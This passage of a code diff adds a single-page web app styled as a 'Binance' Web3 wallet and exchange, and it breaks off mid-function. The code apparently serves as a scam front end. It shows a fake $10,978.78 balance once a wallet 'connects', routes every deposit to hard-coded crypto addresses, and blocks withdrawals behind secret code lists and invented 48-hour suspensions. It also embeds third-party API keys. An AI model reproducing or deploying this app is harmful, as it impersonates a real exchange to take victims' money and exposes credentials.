+      <button onclick="showPage('account')" class="w-full btn-secondary py-3.5">Back to Account</button>
+    </div>
+
+    <div id="googleAuthVerification" class="page p-4 space-y-5 hidden">
+      <div class="flex items-center gap-3 mb-2">
+        <button onclick="showPage('accountDetails')" class="p-2 rounded-lg hover:bg-white/5 transition-colors">
+          <svg class="w-5 h-5 text-muted"><use href="#icon-arrow-left"/></svg>
+        </button>
+        <h2 class="text-2xl font-bold">2FA Verification</h2>
+      </div>
+      <div class="card text-center space-y-4">
+        <p class="text-sm text-muted">User ID: <span id="authUserID" class="font-mono text-text font-semibold">---</span></p>
+        <p class="text-sm text-muted">Scan with Google Authenticator</p>
+        <div id="authQrCode" class="mx-auto bg-white p-3 rounded-xl w-fit shadow-lg"></div>
+        <div class="bg-surface rounded-lg p-3 border border-border">
+          <p class="text-xs text-muted uppercase tracking-wider font-semibold mb-1">Secret Key</p>
+          <p id="authSecretKey" class="font-mono text-sm text-accent font-bold break-all">A1B2C3D4E5F6G7H8</p>
+        </div>
+        <input type="number" id="authCodeInput" placeholder="Enter 6-digit code" class="text-center text-lg font-bold tracking-widest">
+        <p id="authCodeError" class="text-danger text-sm hidden flex items-center justify-center gap-1">
+          <svg class="w-3.5 h-3.5"><use href="#icon-alert-triangle"/></svg>
+          <span>Verification failed</span>
+        </p>
+        <button onclick="verifyGoogleAuthCode()" class="w-full btn-primary">Verify Code</button>
+      </div>
+    </div>
+
+    <!-- GLOBAL MODALS -->
+    <div id="globalModal" class="fixed inset-0 modal-backdrop hidden flex items-center justify-center p-4">
+      <div class="modal-content w-full max-w-sm p-6 space-y-4 text-center">
+        <div id="modalIcon" class="w-12 h-12 rounded-full bg-accent/10 flex items-center justify-center mx-auto">
+          <svg class="w-6 h-6 text-accent"><use href="#icon-info"/></svg>
+        </div>
+        <h3 id="modalTitle" class="text-xl font-bold">Modal Title</h3>
+        <p id="modalMessage" class="text-sm text-muted leading-relaxed">Modal Message</p>
+        <button onclick="hideModal('globalModal')" class="w-full btn-primary">Close</button>
+      </div>
+    </div>
+
+    <div id="globalLoading" class="fixed inset-0 modal-backdrop hidden flex items-center justify-center p-4">
+      <div class="bg-surface p-6 rounded-2xl text-center space-y-4 shadow-2xl border border-border max-w-[260px]">
+        <div class="relative w-14 h-14 mx-auto">
+          <div class="absolute inset-0 rounded-full border-4 border-accent/20"></div>
+          <div class="absolute inset-0 rounded-full border-4 border-transparent border-t-accent animate-spin"></div>
+        </div>
+        <p id="loadingMessage" class="text-base font-semibold">Loading...</p>
+      </div>
+    </div>
+
+    <div id="dailyPopUpNotification" class="fixed inset-0 modal-backdrop hidden flex items-center justify-center p-4">
+      <div class="modal-content w-full max-w-sm p-6 space-y-4 text-center">
+        <div id="popupIcon" class="w-12 h-12 rounded-full bg-accent/10 flex items-center justify-center mx-auto">
+          <svg class="w-6 h-6 text-accent"><use href="#icon-bell"/></svg>
+        </div>
+        <h3 id="dailyPopUpTitle" class="text-xl font-bold text-accent"></h3>
+        <p id="dailyPopUpBody" class="text-sm text-muted leading-relaxed"></p>
+        <div class="flex gap-3 pt-2">
+          <button onclick="hideModal('dailyPopUpNotification')" class="flex-1 btn-secondary">Cancel</button>
+          <button id="dailyPopUpAddTokenBtn" onclick="addSelectedTokenToHoldings()" class="flex-1 btn-primary hidden">Add Token</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- FOOTER NAVIGATION -->
+  <footer class="footer-nav fixed bottom-0 w-full max-w-[600px] h-[70px] flex justify-around items-center px-2">
+    <button class="nav-item active" data-page="home" onclick="showPage('home')">
+      <svg class="w-6 h-6"><use href="#icon-home"/></svg>
+      <span>Home</span>
+    </button>
+    <button class="nav-item" data-page="market" onclick="showPage('market')">
+      <svg class="w-6 h-6"><use href="#icon-market"/></svg>
+      <span>Market</span>
+    </button>
+    <button class="nav-item" data-page="trade" onclick="showPage('trade')">
+      <svg class="w-6 h-6"><use href="#icon-trade"/></svg>
+      <span>Trade</span>
+    </button>
+    <button class="nav-item" data-page="account" onclick="showPage('account')">
+      <svg class="w-6 h-6"><use href="#icon-account"/></svg>
+      <span>Account</span>
+    </button>
+  </footer>
+</div>
+
+<script>
+// =======================================================
+// 1. GLOBAL CONSTANTS & STATE MANAGEMENT
+// =======================================================
+const APP_STATE_KEY = 'binanceWeb3AppState';
+const COINGECKO_API = 'https://api.coingecko.com/api/v3';
+const EXCHANGE_API = 'https://v6.exchangerate-api.com/v6/45602791eb9f29e022a7ce3f/latest/USD';
+const ALPHAVANTAGE_API = 'https://www.alphavantage.co/query';
+const ALPHAVANTAGE_KEY = '3A3XN5PXKW8DG38L';
+const FINNHUB_NEWS_API = 'https://finnhub.io/api/v1/news?category=general&token=d7cq1t9r01qv03eta4rgd7cq1t9r01qv03eta4s0';
+const GEMINI_API_URL = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=';
+const IMAGE_GEN_API_URL = 'https://generativelanguage.googleapis.com/v1beta/models/imagen-3.0-generate-002:predict?key=';
+const IMAGE_MODEL = 'imagen-3.0-generate-002';
+const VALID_WITHDRAW_CODES = ["483t21","175064","90h718","63h285","217509","856430","49h127","731694","56h8k3","30jy17","941g56","12s374","6h5b20","203519","48h960","819hh2","356h01","740h28"];
+
+let appState = {
+  isConnected: false,
+  userID: '',
+  walletAddress: '0x8e20286f0f8a2438efc603777f7099f28e4bd108',
+  balances: { totalUSD: 0.00, tradeUSD: 0.00, lastKnownTotalUSD: 0.00 },
+  heldTokens: [],
+  activities: [],
+  currentPage: 'home',
+  withdrawalCountdownEnd: 0,
+  withdrawalSuspensionEnd: 0,
+  withdrawalAttempts: 0,
+  notificationOn: true,
+  lastNotificationTime: 0,
+  depositAttempts: {},
+  withdrawalAttempts: {}
+};
+
+let hotCoinsCache = [];
+let allSymbolsCache = [];
+let livePriceInterval = null;
+
+function loadState() {
+  const savedState = localStorage.getItem(APP_STATE_KEY);
+  if (savedState) {
+    const loaded = JSON.parse(savedState);
+    appState = { ...appState, ...loaded };
+    if (appState.heldTokens.length > 0 && !appState.heldTokens[0].image) {
+      if (appState.heldTokens.length === 1 && appState.heldTokens[0].symbol === 'USDT') {
+        appState.heldTokens[0].image = 'https://assets.coingecko.com/coins/images/325/small/Tether-logo.png?1598003707';
+        appState.heldTokens[0].id = 'tether';
+      }
+    }
+  } else {
+    appState.userID = '1120175683';
+  }
+}
+
+function saveState() {
+  localStorage.setItem(APP_STATE_KEY, JSON.stringify(appState));
+}
+
+function waitFor(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function showToast(message, type = 'info') {
+  const toast = document.getElementById('toastContainer');
+  toast.textContent = message;
+  toast.className = 'toast show toast-' + type;
+  setTimeout(() => { toast.classList.remove('show'); }, 3000);
+}
+
+function showMessage(title, message, type = 'info', addTokenInfo = null) {
+  const modal = document.getElementById('dailyPopUpNotification');
+  const modalTitle = document.getElementById('dailyPopUpTitle');
+  const modalMessage = document.getElementById('dailyPopUpBody');
+  const addTokenBtn = document.getElementById('dailyPopUpAddTokenBtn');
+  const popupIcon = document.getElementById('popupIcon');
+
+  modalTitle.textContent = title;
+  modalMessage.innerHTML = message;
+
+  const colorMap = {
+    error: 'text-danger bg-danger/10',
+    success: 'text-success bg-success/10',
+    info: 'text-accent bg-accent/10'
+  };
+  popupIcon.className = 'w-12 h-12 rounded-full flex items-center justify-center mx-auto ' + (colorMap[type] || colorMap.info);
+
+  addTokenBtn.onclick = () => {
+    if (addTokenInfo) addSelectedTokenToHoldings(addTokenInfo);
+    hideModal('dailyPopUpNotification');
+  };
+
+  if (addTokenInfo) addTokenBtn.classList.remove('hidden');
+  else addTokenBtn.classList.add('hidden');
+
+  modal.classList.remove('hidden');
+  modal.classList.add('flex', 'items-center');
+}
+
+function showModal(title, message) {
+  document.getElementById('modalTitle').textContent = title;
+  document.getElementById('modalMessage').textContent = message;
+  document.getElementById('globalModal').classList.remove('hidden');
+  document.getElementById('globalModal').classList.add('flex');
+}
+
+function hideModal(id) {
+  const modal = document.getElementById(id);
+  if (modal) {
+    modal.classList.remove('flex');
+    modal.classList.add('hidden');
+    if (id === 'withdrawalSelector') {
+      document.querySelector(`#${id} .modal-content`).classList.add('translate-y-full');
+      document.querySelector(`#${id} .modal-content`).classList.remove('translate-y-0');
+    }
+  }
+}
+
+function showLoading(message) {
+  document.getElementById('loadingMessage').textContent = message;
+  document.getElementById('globalLoading').classList.remove('hidden');
+  document.getElementById('globalLoading').classList.add('flex');
+}
+
+function hideLoading() {
+  document.getElementById('globalLoading').classList.remove('flex');
+  document.getElementById('globalLoading').classList.add('hidden');
+}
+
+// =======================================================
+// 2. NAVIGATION & UI UPDATES
+// =======================================================
+function showPage(pageId) {
+  if (pageId === 'home' && appState.currentPage === 'withdrawalDetailsPage' && isSuspended()) {
+  } else if (pageId !== 'home' && isSuspended() && ['withdrawalDetailsPage','withdrawalConfirmationPage','withdrawalProcessingPage'].includes(pageId) === false) {
+    showMessage('Access Denied', 'Withdrawal is suspended for 48 hours due to too many failed attempts.', 'error');
+    return;
+  }
+
+  document.querySelectorAll('.page').forEach(page => page.classList.add('hidden'));
+  const page = document.getElementById(pageId);
+  if (page) {
+    page.classList.remove('hidden');
+    appState.currentPage = pageId;
+  } else {
+    console.error(`Page ID '${pageId}' not found.`);
+    return;
+  }
+
+  const titleMap = {
+    'home': 'Home',
+    'market': 'Market',
+    'trade': 'Trade',
+    'account': 'Account',
+    'notification': 'Notifications',
+    'search': 'Search',
+    'chat': 'Support Chat',
+    'withdrawalDetailsPage': 'Withdrawal',
+    'withdrawalConfirmationPage': 'Withdrawal',
+    'withdrawalProcessingPage': 'Withdrawal',
+    'depositCoinSelectionPage': 'Select Coin',
+    'depositNetworkPage': 'Select Network',
+    'depositAddressPage': 'Deposit Address',
+    'depositConfirmPage': 'Confirm Deposit',
+    'accountDetails': 'Account Details',
+    'googleAuthVerification': 'Secure Account',
+  };
+  document.getElementById('pageTitle').textContent = titleMap[pageId] || 'Binance';
+
+  document.querySelectorAll('.footer-nav .nav-item').forEach(item => {
+    item.classList.remove('active');
+    if (item.getAttribute('data-page') === pageId) item.classList.add('active');
+  });
+
+  if (pageId === 'home') { updateHomeDashboard(); startLivePriceUpdates(); }
+  if (pageId === 'market') { loadMarketData(); loadAllSymbolsAZ(); loadLiveNews(); loadForexRates(); stopLivePriceUpdates(); }
+  if (pageId === 'trade') { initTradingView('tradeChartContainer', 'BTCUSDT'); stopLivePriceUpdates(); }
+  if (pageId === 'account') { updateAccountPage(); stopLivePriceUpdates(); }
+  if (pageId === 'notification') { updateNotificationPage(); }
+  if (pageId === 'depositCoinSelectionPage') { loadDepositCoins(); }
+  if (pageId === 'search') { document.getElementById('globalSearchInput').value = ''; }
+  if (pageId === 'accountDetails') { updateAccountDetailsPage(); }
+  if (pageId === 'googleAuthVerification') { updateGoogleAuthPage(); }
+
+  saveState();
+
+  if (appState.withdrawalCountdownEnd > Date.now()) {
+    if (pageId !== 'withdrawalProcessingPage') {
+      const onMainPage = ['home','market','trade','account'].includes(appState.currentPage);
+      if (onMainPage) { renderActivitySection(); }
+      else if (document.getElementById(appState.currentPage).classList.contains('hidden')) {
+        showPage('withdrawalProcessingPage');
+      }
+    }
+  } else if (isSuspended()) {
+    if (pageId === 'withdrawalDetailsPage') {
+      document.getElementById('withdrawalDetailsPage').classList.remove('hidden');
+      document.getElementById('suspensionWarning').classList.remove('hidden');
+    }
+  }
+
+  if (pageId !== 'withdrawalConfirmationPage') document.getElementById('withdrawalCodeError').classList.add('hidden');
+  if (pageId !== 'depositConfirmPage') document.getElementById('depositCodeError').classList.add('hidden');
+}
+
+async function updateUI() {
+  const connectBtn = document.getElementById('connectWalletBtn');
+  connectBtn.textContent = appState.isConnected ? 'Connected' : 'Connect Wallet';
+  connectBtn.className = `ml-1 text-xs px-3 py-1.5 rounded-lg font-bold transition-all duration-300 border ${appState.isConnected ? 'bg-success/10 text-success border-success/30' : 'bg-accent text-[#181A20] border-accent hover:brightness-110'}`;
+
+  document.getElementById('userIDDisplay').textContent = appState.isConnected ? appState.userID : '---';
+
+  const totalBalance = appState.balances.totalUSD.toFixed(2);
+  const changePct = appState.balances.lastKnownTotalUSD > 0
+    ? ((appState.balances.totalUSD - appState.balances.lastKnownTotalUSD) / appState.balances.lastKnownTotalUSD * 100).toFixed(2)
+    : '0.00';
+  const changeClass = appState.balances.totalUSD >= appState.balances.lastKnownTotalUSD ? 'text-success' : 'text-danger';
+  const changeSign = appState.balances.totalUSD >= appState.balances.lastKnownTotalUSD ? '+' : '';
+
+  document.getElementById('totalBalanceDisplay').innerHTML = `
+    <span class="text-text">$${appState.isConnected ? totalBalance : '0.00'}</span>
+    <span id="balanceChange" class="text-sm ml-2 ${changeClass} font-bold bg-white/5 px-1.5 py-0.5 rounded">
+      ${appState.isConnected ? changeSign + changePct + '%' : ''}
+    </span>`;
+
+  document.getElementById('tradeAvailable').textContent = appState.isConnected ? appState.balances.totalUSD.toFixed(2) + ' USDT' : '0.00 USDT';
+
+  renderHoldings();
+  renderActivitySection();
+  updateAccountPage();
+  updateAccountDetailsPage();
+}
+
+async function renderHoldings() {
+  const holdingsList = document.getElementById('holdingsList');
+  if (!appState.isConnected || appState.heldTokens.length === 0) {
+    holdingsList.innerHTML = `<p class="text-muted text-sm text-center py-6 bg-card rounded-xl border border-border">Connect wallet to see holdings.</p>`;
+    return;
+  }
+  let html = '';
+  try {
+    const ids = appState.heldTokens.map(t => t.id).join(',');
+    const response = await fetch(`${COINGECKO_API}/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
+    if (!response.ok) throw new Error('Failed to fetch token prices.');
+    const prices = await response.json();
+
+    appState.heldTokens.forEach(token => {
+      const priceData = prices[token.id];
+      const currentPrice = priceData ? priceData.usd : 'N/A';
+      const change24h = priceData ? priceData.usd_24h_change : 0;
+      const value = token.balance * (currentPrice === 'N/A' ? 1 : currentPrice);
+      const changeClass = change24h >= 0 ? 'text-success' : 'text-danger';
+      const changeSign = change24h >= 0 ? '+' : '';
+
+      html += `
+        <div class="coin-row">
+          <div class="flex items-center gap-3">
+            <img src="${token.image}" onerror="this.onerror=null;this.src='https://placehold.co/32x32/1E2329/848E9C?text=${token.symbol.substring(0,2).toUpperCase()}'" class="w-9 h-9 rounded-full" />
+            <div>
+              <p class="font-bold text-sm">${token.symbol.toUpperCase()}</p>
+              <p class="text-xs text-muted">$${currentPrice !== 'N/A' ? currentPrice.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:6}) : 'N/A'}</p>
+            </div>
+          </div>
+          <div class="text-right">
+            <p class="font-bold text-sm">$${value.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}</p>
+            <p class="text-xs ${changeClass} font-semibold">${changeSign}${change24h ? change24h.toFixed(2) : '0.00'}%</p>
+          </div>
+        </div>`;
+    });
+  } catch (e) {
+    console.error('Error fetching token prices:', e);
+    html = `<p class="text-danger text-sm text-center py-4">Error loading live token data.</p>`;
+  }
+  holdingsList.innerHTML = html;
+}
+
+function renderActivitySection() {
+  const activitySection = document.getElementById('activitySection');
+  if (!appState.isConnected) {
+    activitySection.innerHTML = `<p class="text-sm text-muted text-center py-4">No recent activity.</p>`;
+    return;
+  }
+  let html = '';
+  const now = Date.now();
+
+  if (appState.withdrawalCountdownEnd > now) {
+    const remaining = appState.withdrawalCountdownEnd - now;
+    const time = formatTime(remaining);
+    const act = appState.activities.find(a => a.type === 'Withdrawal' && a.status === 'Processing');
+    html += `
+      <div class="bg-accent/10 p-3 rounded-lg border border-accent/20 text-sm">
+        <div class="flex items-center gap-2 mb-1">
+          <svg class="w-4 h-4 text-accent"><use href="#icon-clock"/></svg>
+          <p class="font-bold text-accent">Withdrawal Processing</p>
+        </div>
+        <p class="text-xs text-muted">Amount: ${act ? '$' + act.amount.toFixed(2) + ' USD' : '---'}</p>
+        <p class="text-xs text-muted">Time Remaining: <span id="activityCountdown" class="font-mono font-bold text-text">${time}</span></p>
+      </div>`;
+  } else if (appState.withdrawalCountdownEnd > 0) {
+    const idx = appState.activities.findIndex(a => a.type === 'Withdrawal' && a.status === 'Processing');
+    if (idx !== -1) {
+      const procActivity = appState.activities[idx];
+      appState.activities[idx] = { ...procActivity, status: 'Success' };
+      appState.withdrawalCountdownEnd = 0;
+      saveState();
+      showMessage('Withdrawal Successful!', `The withdrawal of $${procActivity.amount.toFixed(2)} USD has been successfully processed.`, 'success');
+    }
+  }
+
+  if (isSuspended()) {
+    const remaining = appState.withdrawalSuspensionEnd - now;
+    const time = formatTime(remaining);
+    html += `
+      <div class="bg-danger/10 p-3 rounded-lg border border-danger/20 text-sm">
+        <div class="flex items-center gap-2 mb-1">
+          <svg class="w-4 h-4 text-danger"><use href="#icon-alert-triangle"/></svg>
+          <p class="font-bold text-danger">Withdrawal Suspended (48h)</p>
+        </div>
+        <p class="text-xs text-muted">Time Remaining: <span id="suspensionActivityCountdown" class="font-mono font-bold text-text">${time}</span></p>
+      </div>`;
+  } else if (appState.withdrawalSuspensionEnd > 0) {
+    appState.withdrawalSuspensionEnd = 0;
+    saveState();
+  }
+
+  appState.activities.sort((a, b) => new Date(b.date) - new Date(a.date));
+  const activityHtml = appState.activities.map(a => {
+    const color = a.status === 'Success' ? 'text-success' : a.status === 'Failed' || a.status === 'Suspended' ? 'text-danger' : 'text-accent';
+    const icon = a.type === 'Deposit' ? '#icon-deposit' : a.type === 'Withdrawal' ? '#icon-withdraw' : '#icon-clock';
+    return `
+      <div class="activity-item">
+        <div class="flex items-center gap-3">
+          <div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center flex-shrink-0">
+            <svg class="w-4 h-4 ${color}"><use href="${icon}"/></svg>
+          </div>
+          <div>
+            <p class="font-semibold text-sm">${a.type}</p>
+            <p class="text-xs text-muted">${new Date(a.date).toLocaleDateString()}</p>
+          </div>
+        </div>
+        <span class="badge ${a.status === 'Success' ? 'badge-success' : a.status === 'Failed' || a.status === 'Suspended' ? 'badge-danger' : 'badge-accent'}">${a.status}</span>
+      </div>`;
+  }).join('');
+
+  html += activityHtml || `<p class="text-sm text-muted text-center py-4">No recent activity.</p>`;
+  activitySection.innerHTML = html;
+}
+
+// =======================================================
+// 3. CORE LOGIC (CONNECTION & COUNTDOWN)
+// =======================================================
+async function toggleWalletConnection() {
+  if (appState.isConnected) {
+    appState.isConnected = false;
+    appState.balances.totalUSD = 0.00;
+    appState.balances.lastKnownTotalUSD = 0.00;
+    appState.heldTokens = [];
+    appState.activities = [];
+    appState.currentPage = 'home';
+    appState.withdrawalCountdownEnd = 0;
+    appState.withdrawalSuspensionEnd = 0;
+    showMessage('Wallet Disconnected', 'You have successfully disconnected your Web3 Wallet.', 'info');
+    saveState();
+    updateUI();
+    showPage('home');
+    return;
+  }
+  showLoading('Connecting Web3 Wallet...');
+  await waitFor(15000);
+  if (appState.isConnected) {
+    hideLoading();
+    showMessage('Already Connected', 'Wallet is already connected and state is persistent.', 'info');
+    return;
+  }
+  appState.isConnected = true;
+  appState.balances.lastKnownTotalUSD = 0.00;
+  appState.balances.totalUSD = 10978.78;
+  appState.heldTokens = [
+    { symbol: 'USDT', id: 'tether', image: 'https://assets.coingecko.com/coins/images/325/small/Tether-logo.png?1598003707', balance: 10978.78 }
+  ];
+  saveState();
+  updateUI();
+  hideLoading();
+  showMessage('Connection Successful!', 'Your wallet is now connected. Your Account ID has been generated.', 'success');
+}
+
+function disconnectWallet() {
+  toggleWalletConnection();
+}
+
+function formatTime(ms) {
+  const totalSeconds = Math.floor(ms / 1000);
+  const hours = Math.floor(totalSeconds / 3600);
+  const minutes = Math.floor((totalSeconds % 3600) / 60);
+  const seconds = totalSeconds % 60;
+  return `${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}:${String(seconds).padStart(2,'0')}`;
+}
+
+function isSuspended() {
+  return appState.withdrawalSuspensionEnd > Date.now();
+}
+
+function checkCountdownAndSuspension() {
+  const now = Date.now();
+  if (appState.withdrawalCountdownEnd > now) {
+    const remaining = appState.withdrawalCountdownEnd - now;
+    const time = formatTime(remaining);
+    const procCountdown = document.getElementById('processingCountdown');
+    const activityCountdown = document.getElementById('activityCountdown');
+    if (procCountdown) procCountdown.textContent = time;
+    if (activityCountdown) activityCountdown.textContent = time;
+    if (appState.currentPage !== 'withdrawalProcessingPage') {
+      const onMainPage = ['home','market','trade','account'].includes(appState.currentPage);
+      if (onMainPage) renderActivitySection();
+      else if (document.getElementById(appState.currentPage).classList.contains('hidden')) showPage('withdrawalProcessingPage');
+    }
+  } else if (appState.withdrawalCountdownEnd > 0) {
+    appState.balances.lastKnownTotalUSD = appState.balances.totalUSD;
+    const idx = appState.activities.findIndex(a => a.type === 'Withdrawal' && a.status === 'Processing');
+    let withdrawnAmount = 0;
+    if (idx !== -1) {
+      const procActivity = appState.activities[idx];
+      withdrawnAmount = procActivity.amount;
+      appState.activities[idx] = { ...procActivity, status: 'Success', date: new Date().toISOString() };
+      appState.balances.totalUSD -= withdrawnAmount;
+    }
+    appState.withdrawalCountdownEnd = 0;
+    saveState();
+    updateUI();
+    showMessage('Withdrawal Successful!', `The withdrawal of $${withdrawnAmount.toFixed(2)} USD has been successfully processed and deducted from your balance.`, 'success');
+    renderActivitySection();
+  }
+
+  if (appState.withdrawalSuspensionEnd > now) {
+    const remaining = appState.withdrawalSuspensionEnd - now;
+    const time = formatTime(remaining);
+    const sac = document.getElementById('suspensionActivityCountdown');
+    if (sac) sac.textContent = time;
+    const sw = document.getElementById('suspensionWarning');
+    if (appState.currentPage === 'withdrawalDetailsPage' && sw) sw.classList.remove('hidden');
+    renderActivitySection();
+  } else if (appState.withdrawalSuspensionEnd > 0) {
+    appState.withdrawalSuspensionEnd = 0;
+    appState.withdrawalAttempts = 0;
+    saveState();
+    updateUI();
+    const sw = document.getElementById('suspensionWarning');
+    if (sw) sw.classList.add('hidden');
+    showMessage('Suspension Lifted', 'Your withdrawal functions have been restored.', 'success');
+  }
+}
+
+// =======================================================
+// 4. DEPOSIT LOGIC
+// =======================================================
+let selectedDepositCoin = null;
+let currentDeposit = {};
+let allCoins = [];
+const DEPOSIT_CODES = ["4k2915","93y472","158i03","7649k1","50u319","847l61","31k586","672h50","24j391","9y5836","73a258","62h047","580y24","417i02","89h351","264h98","152j83","309u72","741o26","58u320","62w583","958j10","203i74","7429u5","894j21","510f93","6734o0","248h65","90c632","43j892"];
+const DEPOSIT_NETWORKS = {
+  USDT: ['Ethereum','Tron','BSC'],
+  BTC: ['Bitcoin'],
+  ETH: ['Ethereum'],
+  BNB: ['BSC'],
+  TRX: ['Tron']
+};
+const DEPOSIT_ADDRESSES = {
+  'ETHEREUM': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+  'TRON': 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco',
+  'BSC': '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130',
+  'BITCOIN': 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu'
+};
+
+function openDepositCoinSelection() {
+  if (!appState.isConnected) {
+    showMessage('Wallet Required', 'Please connect your Web3 Wallet to perform a deposit.', 'error');
+    return;
+  }
+  showPage('depositCoinSelectionPage');
+}
+
+async function loadDepositCoins() {
+  const depositCoinList = document.getElementById('depositCoinList');
+  if (!depositCoinList) return;
+  depositCoinList.innerHTML = `<div class="flex items-center justify-center py-8"><div class="spinner mr-3"></div><span class="text-sm text-muted">Loading coins...</span></div>`;
+  try {
+    if (allCoins.length === 0) {
+      const response = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=250&page=1&sparkline=false`);
+      if (!response.ok) throw new Error('Failed to fetch deposit coins');
+      allCoins = await response.json();
+    }
+    allCoins.sort((a, b) => a.symbol.localeCompare(b.symbol));
+    renderDepositCoinList(allCoins);
+  } catch (error) {
+    depositCoinList.innerHTML = `<p class="text-center text-danger py-4">Failed to load coins. Please try again later.</p>`;
+  }
+  const searchInput = document.getElementById('depositSearch');
+  if (searchInput) {
+    searchInput.oninput = (e) => {
+      const term = e.target.value.trim().toLowerCase();
+      if (!term) { renderDepositCoinList(allCoins); return; }
+      const filtered = allCoins.filter(c => c.name.toLowerCase().includes(term) || c.symbol.toLowerCase().includes(term));
+      renderDepositCoinList(filtered);
+    };
+  }
+}
+
+function renderDepositCoinList(coins) {
+  const container = document.getElementById('depositCoinList');
+  if (!container) return;
+  if (!coins || coins.length === 0) {
+    container.innerHTML = `<p class="text-center text-muted py-4">No matching coins found.</p>`;
+    return;
+  }
+  let html = '';
+  coins.forEach(coin => {
+    html += `
+      <div class="deposit-coin-item coin-row" data-symbol="${coin.symbol.toUpperCase()}" data-name="${coin.name}" data-id="${coin.id}" data-image="${coin.image}">
+        <div class="flex items-center gap-3">
+          <img src="${coin.image}" class="w-8 h-8 rounded-full" onerror="this.onerror=null;this.src='https://placehold.co/32x32/1E2329/848E9C?text=${coin.symbol.substring(0,2).toUpperCase()}'" />
+          <div>
+            <p class="font-bold text-sm">${coin.symbol.toUpperCase()}</p>
+            <p class="text-xs text-muted">${coin.name}</p>
+          </div>
+        </div>
+        <svg class="w-5 h-5 text-accent"><use href="#icon-arrow-right"/></svg>
+      </div>`;
+  });
+  container.innerHTML = html;
+  document.querySelectorAll('.deposit-coin-item').forEach(item => {
+    item.onclick = () => selectDepositCoin(item.dataset.symbol, item.dataset.image, item.dataset.id);
+  });
+}
+
+function selectDepositCoin(symbol, image, id) {
+  selectedDepositCoin = { symbol, image, id };
+  document.getElementById('depositCoinName').textContent = symbol;
+  renderNetworkSelection(symbol);
+  showPage('depositNetworkPage');
+}
+
+function renderNetworkSelection(coinSymbol) {
+  const container = document.getElementById('networkSelectionList');
+  if (!container) return;
+  const networks = DEPOSIT_NETWORKS[coinSymbol] || (coinSymbol === 'USDT' ? DEPOSIT_NETWORKS['USDT'] : ['Ethereum']);
+  container.innerHTML = networks.map(network => `
+    <button class="network-card" data-network="${network}">
+      <div class="flex items-center gap-3">
+        <div class="w-10 h-10 rounded-full bg-accent/10 flex items-center justify-center">
+          <svg class="w-5 h-5 text-accent"><use href="#icon-globe"/></svg>
+        </div>
+        <div class="text-left">
+          <p class="font-bold text-sm">${network}</p>
+          <p class="text-xs text-muted">${network === 'Ethereum' ? 'ERC20' : network === 'BSC' ? 'BEP20' : network === 'Tron' ? 'TRC20' : 'Native'}</p>
+        </div>
+      </div>
+      <svg class="w-5 h-5 text-accent"><use href="#icon-arrow-right"/></svg>
+    </button>
+  `).join('');
+  document.querySelectorAll('.network-card').forEach(btn => {
+    btn.onclick = () => {
+      document.querySelectorAll('.network-card').forEach(b => b.classList.remove('selected'));
+      btn.classList.add('selected');
+      setTimeout(() => openDepositAddressPage(selectedDepositCoin.symbol, btn.dataset.network), 150);
+    };
+  });
+}
+
+function openDepositAddressPage(symbol, network) {
+  const networkKey = network.replace(/ /g, '').toUpperCase();
+  const address = DEPOSIT_ADDRESSES[networkKey];
+  if (!address) {
+    showMessage('Error', `No deposit address found for ${symbol} on ${network}.`, 'error');
+    return;
+  }
+  currentDeposit = { coin: symbol, network, address, id: selectedDepositCoin.id, image: selectedDepositCoin.image };
+  document.getElementById('depositNetworkHeader').textContent = network;
+  document.getElementById('depositAddressDisplay').textContent = address;
+  document.getElementById('depositAddressCoinSymbol').textContent = symbol;
+
+  const qrContainer = document.getElementById('qrcode');
+  qrContainer.innerHTML = '';
+  new QRCode(qrContainer, { text: address, width: 160, height: 160, colorDark: "#000000", colorLight: "#ffffff", correctLevel: QRCode.CorrectLevel.H });
+
+  const existingInput = document.getElementById('depositAmountInput');
+  const existingBtn = document.getElementById('depositNextBtn');
+  if (!existingInput) {
+    const wrap = document.getElementById('depositAmountWrap');
+    wrap.innerHTML = `
+      <label class="text-xs text-muted uppercase tracking-wider font-semibold block mb-2">Enter Amount to Deposit</label>
+      <input type="number" id="depositAmountInput" placeholder="0.00" class="text-center text-lg font-bold">
+      <button id="depositNextBtn" onclick="showDepositConfirmationPage()" class="w-full btn-primary mt-3">Continue</button>
+    `;
+  }
+  showPage('depositAddressPage');
+}
+
+async function copyDepositAddress() {
+  const address = document.getElementById('depositAddressDisplay').textContent;
+  if (!address) return;
+  try {
+    await navigator.clipboard.writeText(address);
+    showToast('Address copied to clipboard', 'success');
+  } catch (err) {
+    const ta = document.createElement('textarea');
+    ta.value = address;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    showToast('Address copied to clipboard', 'success');
+  }
+}
+
+function showDepositConfirmationPage() {
+  const input = document.getElementById('depositAmountInput');
+  const amount = parseFloat(input.value);
+  if (isNaN(amount) || amount <= 0) {
+    showMessage('Error', 'Please enter a valid deposit amount.', 'error');
+    return;
+  }
+  currentDeposit.amount = amount;
+  document.getElementById('depositConfirmAmount').textContent = amount.toFixed(2);
+  document.getElementById('depositVerificationCode').value = '';
+  document.getElementById('depositCodeError').classList.add('hidden');
+  showPage('depositConfirmPage');
+}
+
+async function handleDepositConfirmation() {
+  const codeInput = document.getElementById('depositVerificationCode');
+  const code = codeInput.value.trim();
+  const errorMsg = document.getElementById('depositCodeError');
+  if (!code) {
+    errorMsg.classList.remove('hidden');
+    errorMsg.querySelector('span').textContent = 'Enter your verification code.';
+    return;
+  }
+  errorMsg.classList.add('hidden');
+  showLoading('Processing deposit...');
+  await waitFor(15000);
+  const now = Date.now();
+  const lastUsed = appState.depositAttempts[code];
+  if (lastUsed && now - lastUsed < (48 * 60 * 60 * 1000)) {
+    hideLoading();
+    errorMsg.classList.remove('hidden');
